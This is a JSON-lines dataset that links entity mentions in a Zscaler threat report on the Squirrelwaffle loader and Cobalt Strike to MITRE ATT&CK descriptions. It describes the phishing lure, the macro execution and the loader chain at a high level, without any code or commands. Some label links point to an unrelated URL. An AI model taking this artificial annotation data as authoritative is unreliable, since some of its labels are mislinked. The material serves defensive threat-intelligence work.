{"mention": "Squirrelwaffle", "context_left": "", "context_right": ": New Loader Delivering Cobalt Strike", "_context_left": "", "_context_right": ": New Loader Delivering Cobalt Strike", "sentence_left": "", "sentence_right": "September 28, 2021", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "Squirrelwaffle: New Loader Delivering", "context_right": "", "_context_left": "Squirrelwaffle: New Loader Delivering ", "_context_right": "", "sentence_left": "", "sentence_right": "September 28, 2021", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Zscaler ThreatLabz has been following an emerging new malware loader known as", "context_right": "that is being used to deliver Cobalt Strike.", "_context_left": "Zscaler ThreatLabz has been following an emerging new malware loader known as ", "_context_right": " that is being used to deliver Cobalt Strike.", "sentence_left": "September 28, 2021", "sentence_right": "In this blog, we will be analyzing the complete attack chain for this new malware family (as shown in Figure 1).", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "Zscaler ThreatLabz has been following an emerging new malware loader known as Squirrelwaffle that is being used to deliver", "context_right": ".", "_context_left": "Zscaler ThreatLabz has been following an emerging new malware loader known as Squirrelwaffle that is being used to deliver ", "_context_right": ".", "sentence_left": "September 28, 2021", "sentence_right": "In this blog, we will be analyzing the complete attack chain for this new malware family (as shown in Figure 1).", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "The", "context_right": "loader is being delivered from the same infrastructure that was delivering the Qakbot banking trojan.", "_context_left": "The ", "_context_right": " loader is being delivered from the same infrastructure that was delivering the Qakbot banking trojan.", "sentence_left": "This campaign has been running since mid-September 2021.", "sentence_right": "Attack Chain", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Qakbot", "context_left": "The Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the", "context_right": "banking trojan.", "_context_left": "The Squirrelwaffle loader is being delivered from the same infrastructure that was delivering the ", "_context_right": " banking trojan.", "sentence_left": "This campaign has been running since mid-September 2021.", "sentence_right": "Attack Chain", "label": "[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)", "label_id": 612, "label_title": "QakBot", "label_link": "https://attack.mitre.org/software/S0650", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 1:", "context_right": "Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Attack%20chain.png)", "_context_left": "![Figure 1: ", "_context_right": " Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Attack%20chain.png)", "sentence_left": "------------", "sentence_right": "Figure 1: Squirrelwaffle Attack Chain", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 1: Squirrelwaffle Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Attack%20chain.png)", "_context_left": "![Figure 1: Squirrelwaffle Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Attack%20chain.png)", "sentence_left": "------------", "sentence_right": "Figure 1: Squirrelwaffle Attack Chain", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 1:", "context_right": "Attack Chain", "_context_left": "Figure 1: ", "_context_right": " Attack Chain", "sentence_left": "![Figure 1: Squirrelwaffle Attack Chain](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Attack%20chain.png)", "sentence_right": "Key Points", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "malicious document file delivered via spam email campaigns", "context_left": "* The campaign started with a", "context_right": "with embedded URLs.", "_context_left": "* The campaign started with a ", "_context_right": " with embedded URLs.", "sentence_left": "----------", "sentence_right": "* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and Qakbot malware campaigns.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Emotet", "context_left": "* The spam campaign is using an email thread hijacking technique that was previously used for", "context_right": "and Qakbot malware campaigns.", "_context_left": "* The spam campaign is using an email thread hijacking technique that was previously used for ", "_context_right": " and Qakbot malware campaigns.", "sentence_left": "* The campaign started with a malicious document file delivered via spam email campaigns with embedded URLs.", "sentence_right": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Qakbot", "context_left": "* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and", "context_right": "malware campaigns.", "_context_left": "* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and ", "_context_right": " malware campaigns.", "sentence_left": "* The campaign started with a malicious document file delivered via spam email campaigns with embedded URLs.", "sentence_right": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "label": "[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)", "label_id": 612, "label_title": "QakBot", "label_link": "https://attack.mitre.org/software/S0650", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "executes", "context_left": "* The malicious document contains a macro that drops and", "context_right": "a VBS file in the %ProgramData% folder.", "_context_left": "* The malicious document contains a macro that drops and ", "_context_right": " a VBS file in the %ProgramData% folder.", "sentence_left": "* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and Qakbot malware campaigns.", "sentence_right": "* The VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.", "label": "The adversary is trying to run malicious code. Execution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery.", "label_id": 588, "label_title": "Execution", "label_link": "https://attack.mitre.org/tactics/TA0002", "entity_class": "CE", "entity_type": "TACTIC", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "The malicious document contains a macro that drops and executes a VBS", "context_left": "*", "context_right": "file in the %ProgramData% folder.", "_context_left": "* ", "_context_right": " file in the %ProgramData% folder.", "sentence_left": "* The spam campaign is using an email thread hijacking technique that was previously used for Emotet and Qakbot malware campaigns.", "sentence_right": "* The VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "* The VBS file downloads the", "context_right": "loader which in turn downloads another loader which further downloads Cobalt Strike.", "_context_left": "* The VBS file downloads the ", "_context_right": " loader which in turn downloads another loader which further downloads Cobalt Strike.", "sentence_left": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "sentence_right": "* Newly registered domains are used to host the loader payload.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Cobalt Strike", "context_left": "* The VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads", "context_right": ".", "_context_left": "* The VBS file downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads ", "_context_right": ".", "sentence_left": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "sentence_right": "* Newly registered domains are used to host the loader payload.", "label": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual) In addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)", "label_id": 1049, "label_title": "Cobalt Strike", "label_link": "https://attack.mitre.org/software/S0154", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "VBS file", "context_left": "* The", "context_right": "downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.", "_context_left": "* The ", "_context_right": " downloads the Squirrelwaffle loader which in turn downloads another loader which further downloads Cobalt Strike.", "sentence_left": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "sentence_right": "* Newly registered domains are used to host the loader payload.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "downloads another loader which further downloads Cobalt Strike", "context_left": "* The VBS file downloads the Squirrelwaffle loader which in turn", "context_right": ".", "_context_left": "* The VBS file downloads the Squirrelwaffle loader which in turn ", "_context_right": ".", "sentence_left": "* The malicious document contains a macro that drops and executes a VBS file in the %ProgramData% folder.", "sentence_right": "* Newly registered domains are used to host the loader payload.", "label": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "label_id": 202, "label_title": "Ingress Tool Transfer", "label_link": "https://attack.mitre.org/techniques/T1105", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Qakbot", "context_left": "* The same infrastructure was used to deliver the", "context_right": "banking trojan.", "_context_left": "* The same infrastructure was used to deliver the ", "_context_right": " banking trojan.", "sentence_left": "* Newly registered domains are used to host the loader payload.", "sentence_right": "Malware Distribution Strategy", "label": "[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)", "label_id": 612, "label_title": "QakBot", "label_link": "https://attack.mitre.org/software/S0650", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "", "context_right": "campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.", "_context_left": "", "_context_right": " campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.", "sentence_left": "-----------------------------", "sentence_right": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "spam emails that attempt to convince victims to click an embedded URL", "context_left": "Squirrelwaffle campaigns generally start via", "context_right": "using a technique known as email thread hijacking.", "_context_left": "Squirrelwaffle campaigns generally start via ", "_context_right": " using a technique known as email thread hijacking.", "sentence_left": "-----------------------------", "sentence_right": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.", "context_left": "", "context_right": "", "_context_left": "", "_context_right": "", "sentence_left": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.", "sentence_right": "Once a victim clicks on the URL, a ZIP file is downloaded that contains a Microsoft Word document.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Once a victim clicks on the URL", "context_left": "", "context_right": ", a ZIP file is downloaded that contains a Microsoft Word document.", "_context_left": "", "_context_right": ", a ZIP file is downloaded that contains a Microsoft Word document.", "sentence_left": "Email thread hijacking leverages emails that have been stolen prior to the attack and later repurposed to dupe a victim into believing that an email is from someone that they know who is replying to the same thread.", "sentence_right": "These documents follow a similar naming convention matching the regular expression diagram-\\d{2,3}.doc.", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "that instructs the user to enable a macro to view the content", "context_left": "This document is using a DocuSign template lure", "context_right": "(as shown in Figure 2).", "_context_left": "This document is using a DocuSign template lure ", "_context_right": " (as shown in Figure 2).", "sentence_left": "For example, the file with an MD5 hash E599A656599A2680C9392C7329D9D519 has the filename diagram-346.doc.", "sentence_right": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "multiple modules that contain VBA code.", "context_left": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with", "context_right": "", "_context_left": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with ", "_context_right": "", "sentence_left": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).", "sentence_right": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 2:", "context_right": "Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "_context_left": "![Figure 2: ", "_context_right": " Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "sentence_left": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.", "sentence_right": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "context_right": "/Docusign.PNG)", "_context_left": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/", "_context_right": "/Docusign.PNG)", "sentence_left": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.", "sentence_right": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "macro", "context_left": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious", "context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "_context_left": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious ", "_context_right": "](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "sentence_left": "All the other documents analyzed by Zscaler ThreatLabz have exactly the same content with multiple modules that contain VBA code.", "sentence_right": "Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
{"mention": "Squirrelwaffle", "context_left": "Figure 2:", "context_right": "Microsoft Word document lure containing a malicious macro", "_context_left": "Figure 2: ", "_context_right": " Microsoft Word document lure containing a malicious macro", "sentence_left": "![Figure 2: Squirrelwaffle Microsoft Word document lure containing a malicious macro](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Squirrelwaffle/Docusign.PNG)", "sentence_right": "Once the user enables the macro, an *AutoOpen()* subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.", "label": "Squirrelwaffle", "label_id": 1274, "label_title": "Squirrelwaffle", "label_link": "http://www.bosch.com#node1fpjil0acx5", "entity_class": "CE", "entity_type": "MALWARE", "document": "zscaler_2021-09-28_squirrelwaffle-new-loader-delivering-cobalt"}
